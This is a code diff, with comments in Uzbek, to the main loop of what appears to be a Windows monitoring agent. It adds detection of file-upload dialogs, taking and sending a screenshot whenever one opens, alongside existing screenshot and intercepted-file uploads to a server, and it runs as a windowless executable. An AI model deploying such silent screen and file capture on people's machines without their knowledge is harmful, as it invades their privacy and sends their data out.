@@ -60,8 +60,17 @@ def main() -> None:
 
     collectors, screenshot, file_provider = build_collectors(cfg.enabled_collectors)
 
+    # Fayl tanlash/yuklash oynasini aniqlovchi (faqat Windows)
+    dialog_detector = None
+    if platform.system() == "Windows" and screenshot is not None:
+        try:
+            from collectors.windows import file_dialog_title as dialog_detector
+        except Exception:  # noqa: BLE001
+            dialog_detector = None
+
     last_screenshot = 0.0
     last_file = 0.0
+    last_dialog_shot = 0.0
     last_hello = time.time()
     last_update_check = time.time()
 
@@ -90,6 +99,15 @@ def main() -> None:
                     data, app, title = shot
                     client.send_screenshot(data, app, title)
                 last_screenshot = now
+
+            # 2c) Fayl yuborish lahzasi: "fayl tanlash/yuklash" oynasi ochilsa skrinshot
+            if registered and screenshot and dialog_detector:
+                dtitle = dialog_detector()
+                if dtitle and now - last_dialog_shot >= 8:
+                    shot = screenshot.capture()
+                    if shot:
+                        client.send_screenshot(shot[0], "Fayl yuborish (tanlash)", dtitle)
+                    last_dialog_shot = now
 
             # 2b) Ushlangan fayllar (har ~8s, bir siklда bir nechta)
             if registered and file_provider and now - last_file >= 8:
@@ -122,4 +140,9 @@ def main() -> None:
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except Exception:  # noqa: BLE001
+        # Har qanday ishga tushish xatosi agent.log'ga yoziladi (oynasiz exe uchun)
+        log.exception("Agent ishga tushishда xato")
+        raise
